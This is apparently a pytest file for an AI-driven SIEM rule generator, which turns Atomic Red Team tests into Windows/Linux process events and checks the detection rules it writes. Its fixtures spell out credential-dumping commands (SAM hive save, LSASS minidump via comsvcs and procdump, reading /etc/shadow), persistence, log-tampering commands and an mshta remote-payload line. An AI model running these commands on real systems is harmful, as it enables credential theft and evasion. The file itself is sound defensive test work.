"""Test AI viết rule cho tấn công ENDPOINT (Windows / Linux): chuyển Atomic Red Team thành event tiến trình, tập lệnh
bình thường, gom theo kỹ thuật ATT&CK, tách train / kiểm tra theo bài thử, kiểm định và ghép mẫu theo dòng lệnh.
Không cần Ollama / Elasticsearch / dataset thật."""
from __future__ import annotations

from pathlib import Path

import pytest

from siem.ai.atomic import atomic_events, child_process, resolve
from siem.ai.baseline import ordinary_processes, platform_of
from siem.ai.golden import Labeled, PublicDatasets, _tokens
from siem.ai.llm import LLMResult
from siem.ai.validate import validate_new_rule
from siem.ai.worker import AIWorker, split_by_test
from siem.pipeline.normalize import get, normalize
from test_ai import NORMAL_URLS, FakeDS, SeqLLM, web, write_rules


def _test(name, platforms, executor, command, guid, args=None):
    return {"name": name, "auto_generated_guid": guid, "supported_platforms": platforms,
            "input_arguments": args or {}, "executor": {"name": executor, "command": command}}


def _tech(tid, name, tactic, tests):
    return {tid: {"technique": {"name": name, "kill_chain_phases": [{"kill_chain_name": "mitre-attack",
                                                                     "phase_name": tactic}]},
                  "atomic_tests": tests}}


# chỉ mục thu nhỏ đúng định dạng atomics/Indexes/index.yaml
INDEX = {"credential-access": {
    **_tech("T1003.002", "OS Credential Dumping: Security Account Manager", "credential-access", [
        _test("Registry dump of SAM", ["windows"], "command_prompt",
              "rem lưu hive\nreg save HKLM\\sam #{out}\\sam & reg save HKLM\\system #{out}\\system\necho xong",
              "g-sam", {"out": {"default": "%temp%"}}),
        _test("esentutl SAM copy", ["windows"], "command_prompt",
              "esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d #{dst}", "g-esent",
              {"dst": {"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SAM"}}),
    ]),
    **_tech("T1003.001", "OS Credential Dumping: LSASS Memory", "credential-access", [
        _test("comsvcs minidump", ["windows"], "powershell",
              "$p = Get-Process lsass\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $p.Id C:\\t\\l.dmp full",
              "g-comsvcs"),
        _test("procdump lsass", ["windows"], "command_prompt", "procdump.exe -accepteula -ma lsass.exe C:\\t\\l.dmp",
              "g-procdump"),
    ]),
    **_tech("T1003.008", "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow", "credential-access", [
        _test("cat shadow", ["linux", "macos"], "sh", "cat /etc/shadow > /tmp/T1003.008.txt; echo ok", "g-shadow"),
        _test("macOS only", ["macos"], "sh", "dscl . list /Users", "g-mac"),
        _test("manual", ["linux"], "manual", "do it by hand", "g-manual"),
    ]),
}}


def atomic_labeled(index=INDEX) -> list[Labeled]:
    out = []
    for raw in atomic_events(index):
        label = raw.pop("label")
        out.append(Labeled(normalize(raw), label))
    return out


# ------------------------------------------------------------------ Atomic Red Team -> event tiến trình
def test_atomic_tests_become_process_events_like_the_agent_sends():
    xs = atomic_labeled()
    by = {(x.label["guid"], x.label["role"], get(x.doc, "process.name")): x for x in xs}
    assert {g for g, _, _ in by} == {"g-sam", "g-esent", "g-comsvcs", "g-procdump", "g-shadow"}   # bỏ macOS / manual
    shell = by[("g-sam", "shell", "cmd.exe")].doc
    assert get(shell, "event.category") == "process" and get(shell, "event.module") == "sysmon"
    assert get(shell, "process.parent.name") == "explorer.exe"
    assert "reg save HKLM\\sam %temp%\\sam" in get(shell, "process.command_line")       # tham số mặc định đã thay
    assert "rem " not in get(shell, "process.command_line")                              # bỏ dòng chú thích
    children = sorted(get(x.doc, "process.command_line") for x in xs if x.label["guid"] == "g-sam" and x.label["role"] == "child")
    assert children == ["reg save HKLM\\sam %temp%\\sam", "reg save HKLM\\system %temp%\\system"]   # 'echo' là lệnh nội bộ
    assert get(by[("g-sam", "child", "reg.exe")].doc, "process.parent.name") == "cmd.exe"
    # PowerShell: cmdlet / biến không tạo tiến trình, chương trình gọi thẳng thì có
    assert [get(x.doc, "process.name") for x in xs if x.label["guid"] == "g-comsvcs"] == ["powershell.exe", "rundll32.exe"]
    assert "C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads" in get(by[("g-esent", "child", "esentutl.exe")].doc,
                                                                     "process.command_line")
    lin = by[("g-shadow", "child", "cat")]
    assert get(lin.doc, "event.module") == "process" and get(lin.doc, "process.parent.name") == "sh"
    assert lin.label["platform"] == "linux" and lin.label["tactics"] == ["credential-access"]
    assert child_process("Get-Process lsass", "powershell") is None and child_process("whoami /all", "powershell")
    assert resolve("#{a}", {"a": {"default": "#{b}x"}, "b": {"default": "y"}}, "linux") == "yx"


def test_ordinary_endpoint_commands_are_normalized_process_events():
    for platform in ("windows", "linux"):
        docs = ordinary_processes(platform)
        assert len(docs) >= 40
        assert all(get(d, "event.category") == "process" and get(d, "process.name") and get(d, "process.command_line")
                   for d in docs)
        assert {platform_of(d) for d in docs} == {platform}
    names = {get(d, "process.name").lower() for d in ordinary_processes("windows")}
    assert {"reg.exe", "rundll32.exe", "certutil.exe", "powershell.exe", "schtasks.exe"} <= names   # công cụ hai mặt


# ------------------------------------------------------------------ gom nhóm, tách tập
def test_grouped_by_technique_per_os_and_split_by_whole_tests():
    g = PublicDatasets(directory=Path("."), attack=atomic_labeled())
    kinds = {g.attack_type(x) for x in g.attack}
    assert kinds == {"windows-T1003", "linux-T1003"}
    sam = next(x for x in g.attack if x.label["guid"] == "g-sam")
    assert g.variant(sam) == "T1003.002 Security Account Manager" and g.evidence(sam) == get(sam.doc, "process.command_line")
    win = [x for x in g.attack if g.domain(x) == "windows"]
    train, test = split_by_test(win, g.variant)
    tr, te = {x.label["guid"] for x in train}, {x.label["guid"] for x in test}
    assert not tr & te and tr | te == {"g-sam", "g-esent", "g-comsvcs", "g-procdump"}
    assert {g.variant(x) for x in train} == {g.variant(x) for x in test}      # mỗi kỹ thuật con có ở cả hai tập


def test_gaps_interleave_web_windows_linux():
    attack = atomic_labeled({"x": {
        **_tech("T1053.005", "Scheduled Task/Job: Scheduled Task", "persistence",
                [_test(f"t{i}", ["windows"], "command_prompt", f"schtasks /create /tn T{i} /tr evil{i}.exe", f"w{i}")
                 for i in range(4)]),
        **_tech("T1053.003", "Scheduled Task/Job: Cron", "persistence",
                [_test(f"t{i}", ["linux"], "sh", f"crontab /tmp/evil{i}", f"l{i}") for i in range(4)]),
        **_tech("T1070.003", "Indicator Removal: Clear Command History", "stealth",
                [_test(f"t{i}", ["linux"], "sh", f"history -c; rm ~/.bash_history{i}", f"h{i}") for i in range(3)]),
    }})
    attack += [Labeled(web(f"/shop/img/logo{i}.gif.bak", i), {"dataset": "t"}) for i in range(12)]
    g = PublicDatasets(directory=Path("."), attack=attack)
    gaps = AIWorker(None, None, g).dataset_gaps([])
    # T1070 Linux chỉ có 3 bài thử (< 4) -> không đủ để tách train / kiểm tra; kỹ thuật con đủ bài thử thành nhóm riêng
    assert [k for k, _ in gaps] == ["t:backup-file", "atomic-red-team:windows-T1053.005",
                                    "atomic-red-team:linux-T1053.003"]


def test_subtechniques_with_enough_tests_get_own_group_rest_stays_with_base():
    from siem.ai.worker import split_subtechniques
    xs = atomic_labeled({"x": {
        **_tech("T1218.011", "Signed Binary Proxy Execution: Rundll32", "stealth",
                [_test(f"r{i}", ["windows"], "command_prompt", f"rundll32 x{i}.dll,Go", f"r{i}") for i in range(5)]),
        **_tech("T1218.005", "Signed Binary Proxy Execution: Mshta", "stealth",
                [_test(f"m{i}", ["windows"], "command_prompt", f"mshta http://h/{i}.hta", f"m{i}") for i in range(2)]),
        **_tech("T1218", "Signed Binary Proxy Execution", "stealth",
                [_test(f"b{i}", ["windows"], "command_prompt", f"odbcconf /a {{REGSVR x{i}.dll}}", f"b{i}") for i in range(2)]),
    }})
    parts = dict(split_subtechniques("atomic-red-team:windows-T1218", xs))
    assert {k: sorted({x.label["guid"] for x in v}) for k, v in parts.items()} == {
        "atomic-red-team:windows-T1218.011": ["r0", "r1", "r2", "r3", "r4"],
        "atomic-red-team:windows-T1218": ["b0", "b1", "m0", "m1"]}


# ------------------------------------------------------------------ kiểm định
def _rule(clauses, match="any"):
    return {"id": "AI-900", "title": "t", "severity": "medium", "type": "match", "condition": {match: clauses}}


def test_endpoint_validation_blocks_test_artifacts_ordinary_commands_and_short_values():
    g = PublicDatasets(directory=Path("."), attack=atomic_labeled())
    win = [x.doc for x in g.attack if g.domain(x) == "windows"]
    normal = ordinary_processes("windows")

    def run(clauses):
        val = validate_new_rule(_rule(clauses), [], win[:6], win[6:], normal, [], 20, app_tokens=set(),
                                normal_label="lệnh Windows bình thường")
        return val, {c.name: c for c in val.checks}

    val, c = run([{"field": "process.command_line", "op": "contains", "value": "ExternalPayloads"}])
    assert not c["dùng chung được"].ok and not val.passed
    val, c = run([{"field": "process.name", "op": "in", "value": ["reg.exe", "rundll32.exe"]}])
    assert not c["báo nhầm trên dữ liệu bình thường"].ok and "lệnh Windows bình thường" in c["báo nhầm trên dữ liệu bình thường"].detail
    assert "vd: reg " in c["báo nhầm trên dữ liệu bình thường"].detail
    val, c = run([{"field": "process.command_line", "op": "contains", "value": "/y"}])
    assert not c["đủ đặc trưng"].ok
    for bare in ("startup", "Test-Path", "-PropertyType", "configure"):            # một từ trơn không là chữ ký
        val, c = run([{"field": "process.command_line", "op": "contains", "value": ["comsvcs.dll, MiniDump", bare]}])
        assert not c["đủ đặc trưng"].ok and bare in c["đủ đặc trưng"].detail
    val, c = run([{"field": "process.command_line", "op": "regex",
                   "value": r"reg(\.exe)?\s+save\s+hklm\\(sam|system|security)|comsvcs(\.dll)?.{0,40}minidump|-ma\s+lsass"}])
    assert val.passed, val.checks


# ------------------------------------------------------------------ worker end-to-end (LLM giả lập)
FIRST_ANSWER = r"""```yaml
title: Credential dumping tools
description: Trích xuất thông tin đăng nhập.
level: high
tags:
  - attack.t1003.002
logsource:
  category: process_creation
  product: windows
detection:
  selection_reg:
    Image|endswith: '\reg.exe'
  selection_lab:
    CommandLine|contains: 'C:\AtomicRedTeam\atomics'
  selection_short:
    CommandLine|contains: '-ma'
  selection_save:
    Image|endswith: '\reg.exe'
    CommandLine|contains|all:
      - 'save'
      - 'hklm\sam'
  selection_procdump:
    CommandLine|contains|all: ['procdump', 'lsass']
  condition: 1 of selection_*
```"""
LSASS_ANSWER = r"""```yaml
title: LSASS dump
logsource: {category: process_creation, product: windows}
detection:
  selection_comsvcs:
    CommandLine|contains|all: ['comsvcs', 'minidump']
  condition: selection_comsvcs
```"""
SHADOW_ANSWER = "detection:\n  sel:\n    CommandLine|contains: '/etc/shadow'\n  condition: sel\n"


def test_endpoint_rule_assembled_from_command_line_patterns(tmp_path, monkeypatch):
    rd = write_rules(tmp_path)
    monkeypatch.setattr("siem.ai.worker.settings.RULES_DIR", rd)
    monkeypatch.setattr("siem.ai.worker.settings.AI_KNOWLEDGE_ROUND", False)   # test riêng ở test_ai_endpoint
    normal = [Labeled(web(u, i), {"class": "normal"}) for i, u in enumerate(NORMAL_URLS * 5)]
    for platform in ("windows", "linux"):
        normal += [Labeled(d, {"dataset": "baseline-endpoint", "class": "normal", "platform": platform})
                   for d in ordinary_processes(platform)]
    golden = PublicDatasets(directory=Path("."), attack=atomic_labeled(), normal=normal)
    # lượt đầu: reg.exe đứng riêng khớp lệnh quản trị bình thường; thư mục Atomic là dấu vết môi trường thử; "-ma" quá
    # ngắn và không gắn với chương trình nào -> loại. Bài thử reg save và procdump nằm ở tập KIỂM TRA: hai vế đó không
    # khớp event train nào nhưng an toàn -> giữ làm vế "chưa kiểm chứng" (hiểu biết của model về kỹ thuật).
    # Lượt bổ sung dồn vào LSASS (comsvcs trong train) -> vế comsvcs + minidump.
    llm = SeqLLM([FIRST_ANSWER, LSASS_ANSWER, SHADOW_ANSWER] * 3)
    saved = []
    AIWorker(None, llm, golden, rules_dir=rd, ds_factory=lambda es: FakeDS({}, []), save=saved.append).run_cycle("an")
    p = next(p for p in saved if p["target"] == "gap-dataset:atomic-red-team:windows-T1003")
    assert p["status"] == "pending", p["validation"]["checks"]
    rule = p["proposal"]
    cl = "process.command_line"
    assert rule["condition"] == {"any": [
        {"all": [{"field": cl, "op": "contains", "value": "comsvcs"}, {"field": cl, "op": "contains", "value": "minidump"}]},
        {"all": [{"field": "process.name", "op": "eq", "value": "reg.exe"},
                 {"field": cl, "op": "contains", "value": "save"}, {"field": cl, "op": "contains", "value": "hklm\\sam"}]},
        {"all": [{"field": cl, "op": "contains", "value": "procdump"}, {"field": cl, "op": "contains", "value": "lsass"}]}]}
    # bài thử LLM chưa thấy: procdump (shell + con) và reg save HKLM\sam (con; HKLM\system thì không)
    assert p["validation"]["metrics"]["test_detected"] == 3
    assert len(p["llm"]["attempts"][0]["unverified"]) == 2 and "chưa có mẫu train" in p["history"][-1]["text"]
    assert [a["focus"] for a in p["llm"]["attempts"][:2]] == [None, "T1003.001 LSASS Memory"]
    assert rule["mitre"] == {"tactic": "credential-access", "technique": ["T1003", "T1003.002"]}   # nhãn dataset luôn có
    assert {"endpoint", "windows", "windows-T1003"} <= set(rule["tags"]) and rule["severity"] == "medium"
    assert "CommandLine|contains|all" in rule["sigma"] and "product: windows" in rule["sigma"]
    checks = {c["name"]: c for c in p["validation"]["checks"]}
    assert "lệnh Windows bình thường" in checks["báo nhầm trên dữ liệu bình thường"]["detail"]
    assert p["validation"]["metrics"]["test_is_holdout"] is True
    first, refine = llm.prompts[0], llm.prompts[1]
    assert "ATT&CK technique: OS Credential Dumping (T1003; tactic credential-access) on Windows" in first
    assert '"CommandLine"' in first and '"process_creation"' in first and "cs-uri" not in first
    assert '"samples"' in refine and '"procdump"' in refine.split('"kept_detections"')[1].split('"rejected')[0]
    assert "specific to the sample application or test environment" in refine and "not a signature" in refine
    # reg.exe đứng riêng: chặn ngay vì chỉ có tên chương trình phổ biến (trước 11/10: mới biết khi khớp lệnh bình thường)
    assert "only names a common program (reg.exe)" in refine


def test_sigma_reference_prefers_same_technique_and_os_process_creation():
    sig = [
        {"title": "Webserver credential dump keyword", "logsource": {"category": "webserver"}, "tags": ["attack.t1190"],
         "detection": "keywords: [lsass, sam, dump]"},
        {"title": "Linux shadow file read", "logsource": {"category": "process_creation", "product": "linux"},
         "tags": ["attack.t1003.008"], "detection": "CommandLine|contains: /etc/shadow"},
        {"title": "LSASS dump via comsvcs", "logsource": {"category": "process_creation", "product": "windows"},
         "tags": ["attack.credential-access", "attack.t1003.001"], "detection": "CommandLine|contains: comsvcs minidump"},
    ]
    g = PublicDatasets(directory=Path("."), sigma=sig)
    g._sigma_tokens = [_tokens(" ".join([r["title"], str(r["logsource"]), r["detection"]])) for r in sig]
    docs = [x.doc for x in atomic_labeled() if x.label["platform"] == "windows"]
    got = g.similar_sigma(docs, "sysmon", hint="OS Credential Dumping", techniques=["T1003"], platform="windows")
    assert got[0]["title"] == "LSASS dump via comsvcs"


# ------------------------------------------------------------------ sửa sau khi chạy thật (4/10)
def test_variant_of_technique_without_subtechniques_is_main_program():
    """Kỹ thuật không có kỹ thuật con: biến thể = chương trình chính (reg.exe...), không phải tên bài thử."""
    xs = atomic_labeled({"x": _tech("T1112", "Modify Registry", "stealth", [
        _test("a", ["windows"], "command_prompt", "reg add HKLM\\x /v A /d 1 /f", "r1"),
        _test("b", ["windows"], "command_prompt", "echo hi & reg add HKCU\\y /v B /d 0 /f", "r2"),
        _test("c", ["windows"], "powershell", "Set-ItemProperty -Path HKLM:\\z -Name C -Value 1", "r3")])})
    g = PublicDatasets(directory=Path("."), attack=xs)
    assert {x.label["guid"]: g.variant(x) for x in xs} == {"r1": "reg.exe", "r2": "reg.exe",
                                                           "r3": "powershell Set-ItemProperty"}


def test_regex_cannot_sneak_bare_words_or_tiny_branches_past_the_guard():
    """Rule thật từng lọt kiểm định trên log Splunk: từ đơn ghép bằng |, nhánh rất ngắn, cú pháp bọc của công cụ thử."""
    from siem.ai.validate import regex_weakness, weak_values
    weak = [r"(?i)(startup|autostart)", r"rundll32\.exe.*\#2|\#2.*rundll32\.exe|.*\#2.*", r"\s&\s*\{", r"stop"]
    ok = [r"ComputerDefaults\.exe", r"/d\s+[A-Za-z0-9+/=]{20,}", r"reg(\.exe)?\s+save\s+hklm\\sam",
          r"comsvcs(\.dll)?.{0,40}minidump|procdump(\.exe)?\s.*lsass"]
    assert all(regex_weakness(p) for p in weak), [p for p in weak if not regex_weakness(p)]
    assert not any(regex_weakness(p) for p in ok), [(p, regex_weakness(p)) for p in ok if regex_weakness(p)]
    clause = {"field": "process.command_line", "op": "regex", "value": weak[0]}
    assert weak_values([clause]) == [weak[0]]
    assert weak_values([{**clause, "field": "url.decoded"}]) == []          # chỉ áp dụng cho dòng lệnh


def test_windows_paths_in_regex_are_repaired_not_rejected():
    """Đường dẫn Windows viết thẳng vào regex (\\P, \\M là mã thoát sai) được hiểu là dấu '\\' thật; regex đúng giữ nguyên."""
    import re
    from siem.ai.validate import build_condition, fix_regex
    bad = r".*C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\.*"
    fixed = fix_regex(bad)
    assert re.search(fixed, r"cmd /c copy evil.vbs C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\x.vbs")
    assert fix_regex(r"reg(\.exe)?\s+save\s+hklm\\sam") == r"reg(\.exe)?\s+save\s+hklm\\sam"
    cond = build_condition("any", [{"field": "process.command_line", "op": "regex", "value": [bad, r"\d+"]}])
    assert cond["any"][0]["value"] == [fixed, r"\d+"]


def test_cloud_attacks_run_through_stratus_are_not_endpoint_samples():
    xs = atomic_labeled({"x": _tech("T1685.002", "Disable or Modify Tools: Disable or Modify Cloud Log", "stealth", [
        _test("AWS - Remove VPC Flow Logs using Stratus", ["linux"], "sh",
              "export AWS_REGION=us-west-2\nstratus warmup aws.defense-evasion.vpc-remove-flow-logs\n"
              "stratus detonate aws.defense-evasion.vpc-remove-flow-logs", "s1"),
        _test("Stop auditd", ["linux"], "sh", "systemctl stop auditd", "s2")])})
    assert {x.label["guid"] for x in xs} == {"s2"}


def test_pipe_in_command_line_stays_literal_and_lab_tool_names_are_artifacts():
    from siem.ai import sigma
    from siem.ai.validate import _app_specific
    rule = sigma.parse("detection:\n  sel:\n    CommandLine|contains: 'cat ~/.bash_history | grep pass'\n"
                       "  condition: sel\n")
    cond, _ = sigma.compile_rule(rule, "linux")          # Sigma: contains luôn là chuỗi, '|' là pipe của shell
    assert cond == {"field": "process.command_line", "op": "contains", "value": "cat ~/.bash_history | grep pass"}
    tied = _app_specific([{"field": "process.command_line", "op": "contains",
                           "value": "stratus detonate aws.credential-access.ec2-get-password-data"}], set())
    assert tied == {"stratus", "aws.credential-access.ec2-get-password-data"}


def test_approval_rechecks_dataset_rule_against_current_baseline(tmp_path, monkeypatch):
    """Đề xuất tạo trước khi tập lệnh bình thường được bổ sung: lúc duyệt vẫn bị chặn nếu giờ khớp lệnh bình thường."""
    from siem.ai import deploy
    from test_ai import PropES
    rd = write_rules(tmp_path)
    normal = [Labeled(d, {"dataset": "baseline-endpoint", "class": "normal", "platform": "linux"})
              for d in ordinary_processes("linux")]
    monkeypatch.setattr(deploy, "golden", lambda: PublicDatasets(directory=Path("."), normal=normal))

    def proposal(values):
        rule = {"id": "AI-050", "title": "t", "severity": "medium", "type": "match",
                "tags": ["ai-generated", "dataset-gap", "endpoint", "linux", "linux-T1552"],
                "condition": {"any": [{"field": "process.command_line", "op": "contains", "value": values}]}}
        return PropES({"id": "0123456789ab", "kind": "new_rule", "target": "gap-dataset:atomic-red-team:linux-T1552",
                       "target_rule_id": "AI-050", "proposal": rule, "status": "pending", "required_approvals": 1,
                       "approvals": [], "llm": {"model": "fake"}, "updated_at": ""})

    es = proposal(["find / -name", "aws.credential-access.ec2-get-password-data"])
    with pytest.raises(deploy.DeployError) as e:
        deploy.approve(es, "0123456789ab", "an", rd, now="t1")
    assert "lệnh linux bình thường" in str(e.value) and "find / -name nginx.conf" in str(e.value)
    assert "aws.credential-access.ec2-get-password-data" in str(e.value)
    assert not list((rd / "ai").glob("*.yml")) and es.doc["status"] == "invalid"
    es = proposal(["-path '*/.aws/credentials'"])
    assert deploy.approve(es, "0123456789ab", "an", rd, now="t2")["status"] == "approved"


# ------------------------------------------------------------------ bước 1 (8/10): vế SigmaHQ + lượt kiến thức
SIGMAHQ = [
    {"id": "aaaa-1111", "title": "SAM hive dump via reg.exe", "author": "Tester A", "level": "high", "status": "test",
     "logsource": {"category": "process_creation", "product": "windows"},
     "tags": ["attack.credential-access", "attack.t1003.002"],
     "detection": "selection:\n  Image|endswith: '\\reg.exe'\n  CommandLine|contains|all:\n    - ' save '\n"
                  "    - 'hklm\\sam'\ncondition: selection\n"},
    {"id": "bbbb-2222", "title": "Linux shadow read", "author": "Tester B", "level": "medium", "status": "test",
     "logsource": {"category": "process_creation", "product": "linux"}, "tags": ["attack.t1003.008"],
     "detection": "selection:\n  CommandLine|contains: '/etc/shadow'\ncondition: selection\n"},
    {"id": "cccc-3333", "title": "Unrelated discovery", "author": "Tester C", "level": "low", "status": "test",
     "logsource": {"category": "process_creation", "product": "windows"}, "tags": ["attack.t1087.002"],
     "detection": "selection:\n  CommandLine|contains: 'net group /domain'\ncondition: selection\n"},
]
COMSVCS = "detection:\n  sel:\n    CommandLine|contains|all: ['comsvcs', 'minidump']\n  condition: sel\n"
KNOWLEDGE = ("```yaml\ntitle: Other LSASS dumpers\nlogsource: {category: process_creation, product: windows}\n"
             "detection:\n  selection_procdump:\n    CommandLine|contains|all: ['procdump', 'lsass']\n"
             "  condition: selection_procdump\n```")


def test_sigmahq_candidates_and_knowledge_round_cover_procedures_missing_from_train(tmp_path, monkeypatch):
    """Bài thử reg save và procdump nằm ở tập KIỂM TRA: model lượt đầu chỉ viết comsvcs (có trong train). Rule SigmaHQ
    cùng kỹ thuật (reg save hklm\\sam) và lượt hỏi cách làm khác (procdump) lấp phần đó; rule ghi nguồn SigmaHQ."""
    rd = write_rules(tmp_path)
    monkeypatch.setattr("siem.ai.worker.settings.RULES_DIR", rd)
    normal = [Labeled(web(u, i), {"class": "normal"}) for i, u in enumerate(NORMAL_URLS * 5)]
    for platform in ("windows", "linux"):
        normal += [Labeled(d, {"dataset": "baseline-endpoint", "class": "normal", "platform": platform})
                   for d in ordinary_processes(platform)]
    golden = PublicDatasets(directory=Path("."), attack=atomic_labeled(), normal=normal, sigma=SIGMAHQ)
    llm = SeqLLM([COMSVCS, KNOWLEDGE] + ["no_rule: không có gì thêm"] * 30)
    saved = []
    AIWorker(None, llm, golden, rules_dir=rd, ds_factory=lambda es: FakeDS({}, []), save=saved.append).run_cycle("an")
    p = next(p for p in saved if p["target"] == "gap-dataset:atomic-red-team:windows-T1003")
    assert p["status"] == "pending", p["validation"]["checks"]
    sources = {(a["source"], a["verified"]) for a in p["llm"]["atoms"]}
    assert {("model", True), ("knowledge", False), ("sigmahq", False)} <= sources
    assert p["validation"]["metrics"]["test_detected"] >= 3             # procdump (shell + con) + reg save hklm\sam
    assert [a["focus"] for a in p["llm"]["attempts"][:2]] == [None, "knowledge"]
    assert '"covered"' in llm.prompts[1] and "OS Credential Dumping" in llm.prompts[1]
    sig = p["sigma"]
    assert "related:" in sig and "aaaa-1111" in sig and "type: derived" in sig and "Tester A" in sig
    assert "bbbb-2222" not in sig and "cccc-3333" not in sig            # khác hệ điều hành / khác kỹ thuật
    assert any("SigmaHQ" in h["text"] for h in p["history"])


def test_sigmahq_for_picks_same_subtechnique_not_siblings():
    rules = [
        {"id": "sub", "logsource": {"category": "process_creation", "product": "windows"}, "tags": ["attack.t1003.003"],
         "level": "medium", "status": "test"},
        {"id": "parent-only", "logsource": {"category": "process_creation", "product": "windows"},
         "tags": ["attack.t1003"], "level": "high", "status": "stable"},
        {"id": "sibling", "logsource": {"category": "process_creation", "product": "windows"},
         "tags": ["attack.t1003", "attack.t1003.001"], "level": "critical", "status": "stable"},
        {"id": "linux", "logsource": {"category": "process_creation", "product": "linux"}, "tags": ["attack.t1003.003"]},
    ]
    g = PublicDatasets(directory=Path("."), sigma=rules)
    assert [r["id"] for r in g.sigmahq_for("T1003.003", "windows")] == ["sub", "parent-only"]
    assert [r["id"] for r in g.sigmahq_for("T1003", "windows")] == ["sibling", "parent-only", "sub"]
